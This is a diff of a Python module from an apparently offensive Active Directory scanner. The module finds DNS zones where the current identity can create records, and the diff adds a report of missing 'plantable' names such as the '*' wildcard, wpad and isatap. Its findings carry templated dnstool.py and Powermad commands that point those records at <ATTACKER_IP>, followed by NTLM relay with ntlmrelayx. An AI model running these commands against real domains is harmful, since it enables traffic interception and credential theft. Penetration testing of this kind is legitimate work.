@@ -23,12 +23,15 @@ parsing (reuses modules.acls._parse_dacl). No writes.
 
 Wildcard awareness (v2.14.0): a `*` record answers every unresolved name in a
 zone, so its presence neutralises classic missing-name / wpad injection there but
-makes the `*` itself a domain-wide takeover primitive — a present wildcard is
-reported (and its overwrite flagged CRITICAL), and its absence is surfaced as the
-strongest create-child target (plant a catch-all `*`).
+makes the `*` itself a domain-wide takeover primitive.
 
-⚠️ NOT VALIDATED LIVE (v2.12.0): implemented and unit-tested against mocked
-   records / synthetic descriptors, but never run against a real DC.
+Attack-surface framing (v2.20.0): the value is not the full record dump (recon
+only — demoted behind `-v`) but the **gaps you can act on**. For every zone where
+the current identity holds Create-Child, the module lists the high-value names
+that are ABSENT and therefore *plantable* — `*` (CRITICAL, domain-wide catch-all),
+`wpad` (HIGH, WPAD coercion), `isatap` (MEDIUM) — each with a ready dnstool.py /
+Powermad command. A present `*` in a zone neutralises planting there (overwrite it
+instead → see writable records).
 """
 
 from modules.base import BaseModule, ScanContext
@@ -146,7 +149,9 @@ class ADIDNSModule(BaseModule):
 
         self._dump_records(ctx, nodes)
         self._report_wildcards(ctx, wild_nodes)
-        self._check_zone_create(ctx, zones, nodes, wild_zones, dns_sids)
+        spoofable = self._spoofable_zones(ctx, zones, dns_sids)
+        self._check_zone_create(ctx, spoofable)
+        self._check_missing_names(ctx, spoofable, nodes, wild_zones)
         self._check_record_dacls(ctx, nodes, dns_sids)
 
     @staticmethod
@@ -186,22 +191,26 @@ class ADIDNSModule(BaseModule):
         out = ctx.out
         if not nodes:
             return
-        out.subsection("DNS records")
-        rows = []
-        for n in sorted(nodes, key=lambda x: (x["zone"], x["name"])):
-            for rtype, val, _ts in n["records"]:
-                if rtype == "ZERO":
-                    continue
-                hl = (rtype in ("A", "AAAA", "CNAME", "SRV"))
-                rows.append([
-                    n["fqdn"],
-                    f"{C.CYAN}{rtype}{C.RESET}" if hl else rtype,
-                    val,
-                ])
-        out.table(["Name", "Type", "Value"], rows, indent=4)
-
+        out.subsection("DNS records (recon)")
         hosts = sorted({n["fqdn"] for n in nodes
                         for (t, _v, _s) in n["records"] if t in ("A", "AAAA")})
+        if getattr(ctx.args, "verbose", False):
+            rows = []
+            for n in sorted(nodes, key=lambda x: (x["zone"], x["name"])):
+                for rtype, val, _ts in n["records"]:
+                    if rtype == "ZERO":
+                        continue
+                    hl = (rtype in ("A", "AAAA", "CNAME", "SRV"))
+                    rows.append([
+                        n["fqdn"],
+                        f"{C.CYAN}{rtype}{C.RESET}" if hl else rtype,
+                        val,
+                    ])
+            out.table(["Name", "Type", "Value"], rows, indent=4)
+        else:
+            out.info(f"{len(nodes)} record(s), {len(hosts)} A/AAAA host(s) "
+                     "— full table with -v. Recon value: hosts not joined to AD "
+                     "(appliances / Linux / net gear) that the computers module misses.")
         if hosts:
             ctx.quick_wins.add(
                 Severity.INFO,
@@ -245,13 +254,31 @@ class ADIDNSModule(BaseModule):
         )
 
     # ----------------------------------------------------------- zone spoof
-    def _check_zone_create(self, ctx: ScanContext, zones: dict, nodes: list,
-                           wild_zones: set, dns_sids: set = frozenset()) -> None:
-        out = ctx.out
-        out.subsection("Zone Create-Child (record spoofing)")
-        dsid = ctx.domain_sid
+    # High-value names an attacker plants into a create-child zone; the value is
+    # in their ABSENCE (missing = plantable). Severity assumes broad reach.
+    _PLANTABLE = [
+        ("*",      Severity.CRITICAL,
+         "wildcard — a domain-wide catch-all answering EVERY otherwise-unresolved "
+         "name in the zone (WPAD, typos, dead hosts) → mass NTLM coercion / MITM"),
+        ("wpad",   Severity.HIGH,
+         "WPAD — clients fetch http://wpad/wpad.dat for proxy config → force traffic "
+         "through an attacker proxy → NTLM capture / relay"),
+        ("isatap", Severity.MEDIUM,
+         "ISATAP — auto-tunnel router host; planting it can draw IPv6-in-IPv4 "
+         "traffic to an attacker"),
+    ]
 
-        spoofable = []   # (zone_name, trustee_name, trustee_sid, broad)
+    @staticmethod
+    def _downgrade(sev):
+        return {Severity.CRITICAL: Severity.HIGH,
+                Severity.HIGH: Severity.MEDIUM}.get(sev, sev)
+
+    def _spoofable_zones(self, ctx: ScanContext, zones: dict,
+                         dns_sids: set = frozenset()) -> list:
+        """Zones whose DACL grants Create-Child to a non-privileged principal.
+        Returns (zone_name, trustee_name, trustee_sid, broad)."""
+        dsid = ctx.domain_sid
+        spoofable = []
         for z in zones.values():
             if not z["sd"]:
                 continue
@@ -261,64 +288,87 @@ class ADIDNSModule(BaseModule):
                 if (sid in _SKIP_SIDS or sid in dns_sids
                         or is_privileged_sid(sid, dsid) or is_high_value_sid(sid, dsid)):
                     continue
-                mask = ace["mask"]
-                if mask & (CREATE_CHILD | GENERIC_ALL | GENERIC_WRITE):
+                if ace["mask"] & (CREATE_CHILD | GENERIC_ALL | GENERIC_WRITE):
                     broad = _is_broad(sid, dsid)
-                    # keep the broadest trustee as the headline for the zone
-                    if best is None or (broad and not best[2]):
+                    if best is None or (broad and not best[2]):  # prefer broadest
                         best = (sid, resolve_sid(sid, dsid), broad)
             if best:
                 spoofable.append((z["name"], best[1], best[0], best[2]))
+        return spoofable
 
+    def _check_zone_create(self, ctx: ScanContext, spoofable: list) -> None:
+        """The permission surface: who can create records in which zone. The
+        actionable 'what to plant' lives in _check_missing_names."""
+        out = ctx.out
+        out.subsection("Zone Create-Child (record spoofing surface)")
         if not spoofable:
             out.success("No zone grants Create-Child to a non-privileged principal")
             return
-
         rows = [[zn, tname, tsid, "broad (any user)" if broad else "group-scoped"]
                 for (zn, tname, tsid, broad) in spoofable]
         out.table(["Zone", "Trustee", "SID", "Reach"], rows, indent=4,
                   highlight_fn=lambda r: C.RED if "broad" in r[3] else C.YELLOW)
+        out.info("→ what to plant in these zones: see 'Plantable missing names' below")
 
-        for zn, tname, tsid, broad in spoofable:
-            sev = Severity.HIGH if broad else Severity.MEDIUM
-            is_reverse = zn.endswith(".arpa")
-            has_wild   = zn.lower() in wild_zones
+    def _check_missing_names(self, ctx: ScanContext, spoofable: list,
+                             nodes: list, wild_zones: set) -> None:
+        """For each create-child zone, the high-value names that are ABSENT (and
+        therefore plantable) — the actionable gap, not a full record dump."""
+        out = ctx.out
+        out.subsection("Plantable missing names (interesting absent records)")
+        if not spoofable:
+            out.info("No create-child zone for this identity → nothing plantable")
+            return
+
+        desc_of = {n: d for (n, _s, d) in self._PLANTABLE}
+        rows, findings = [], []   # findings: (zn, tname, tsid, name, sev, broad)
+        skipped = []
+        for (zn, tname, tsid, broad) in spoofable:
+            # wpad/catch-all only bite in a CLIENT-facing forward zone. Reverse
+            # (.arpa) and locator/service zones (_msdcs, _sites, _tcp…) are
+            # technical — clients never resolve wpad there, so skip them.
+            if zn.endswith(".arpa") or any(p.startswith("_") for p in zn.split(".")):
+                skipped.append(zn)
+                continue
             have = {n["name"].lower() for n in nodes if n["zone"] == zn}
+            if zn.lower() in wild_zones:
+                rows.append([zn, "*", f"{C.YELLOW}present{C.RESET}",
+                             "wildcard already answers unresolved names → overwrite "
+                             "it instead (see writable records)"])
+                continue
+            for (name, sev, desc) in self._PLANTABLE:
+                if name in have:
+                    rows.append([zn, name, f"{C.GREEN}present{C.RESET}", "-"])
+                else:
+                    rows.append([zn, name, f"{C.RED}ABSENT → plantable{C.RESET}", desc])
+                    findings.append((zn, tname, tsid, name, sev, broad))
 
-            if is_reverse:
-                scope_note = "\n"
-            elif has_wild:
-                # A wildcard already answers unresolved queries, so planting a new
-                # missing-name / wpad record is largely moot — the lever is to
-                # overwrite the existing '*' (see the writable-records finding).
-                scope_note = (
-                    " NOTE: a '*' wildcard already exists in this zone → it answers "
-                    "unresolved queries, so planting a new missing-name / wpad record "
-                    "is largely neutralised; overwriting the existing '*' is the path "
-                    "instead (see 'writable records').\n")
-            else:
-                wpad = ("wpad is ABSENT → add it to coerce WPAD clients. "
-                        if "wpad" not in have else "")
-                scope_note = (
-                    f" {wpad}No '*' wildcard exists → creating one is a DOMAIN-WIDE "
-                    "catch-all for every unresolved name (strongest):\n"
-                    f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
-                    f"--action add --record '*' --data <ATTACKER_IP> --type A "
-                    f"--zone {zn} {ctx.args.dc}\n")
+        if rows:
+            out.table(["Zone", "Name", "Status", "Why it matters"], rows, indent=4)
+        if skipped:
+            out.info(f"Skipped {len(skipped)} technical zone(s) (clients don't "
+                     "resolve wpad there): " + ", ".join(sorted(set(skipped))))
+        if not findings:
+            out.info("No high-value name is both absent and plantable here")
+            return
 
+        for (zn, tname, tsid, name, sev, broad) in findings:
+            eff = sev if broad else self._downgrade(sev)
+            rec = "'*'" if name == "*" else name
+            who = "any user" if broad else tname
             ctx.quick_wins.add(
-                sev,
-                f"ADIDNS spoofing — '{tname}' can create records in zone {zn}",
-                f"The zone DACL grants Create-Child to {tname} ({tsid}), so this "
-                "identity can add arbitrary DNS records → NTLM coercion / relay "
-                "(point a resolved-but-missing name, or wpad, at an attacker host)."
-                + scope_note +
+                eff,
+                f"ADIDNS — plant missing '{name}' in zone {zn} ({who})",
+                f"'{name}' is ABSENT from {zn} and this identity has Create-Child "
+                f"there → it can be planted. {desc_of[name]}.\n"
                 "  # dirkjanm dnstool.py (impacket):\n"
                 f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
-                f"--action add --record wpad --data <ATTACKER_IP> --type A "
+                f"--action add --record {rec} --data <ATTACKER_IP> --type A "
                 f"--zone {zn} {ctx.args.dc}\n"
-                "  # or Powermad (from a domain-joined Windows host):\n"
-                f"  Invoke-DNSUpdate -DNSType A -DNSName wpad -DNSData <ATTACKER_IP>",
+                "  # or Powermad (domain-joined Windows host):\n"
+                f"  Invoke-DNSUpdate -DNSType A -DNSName {name} -DNSData <ATTACKER_IP>\n"
+                "  then coerce + relay (impacket-ntlmrelayx) / intercept the "
+                "redirected auth.",
             )
 
     # ---------------------------------------------------- record overwrite
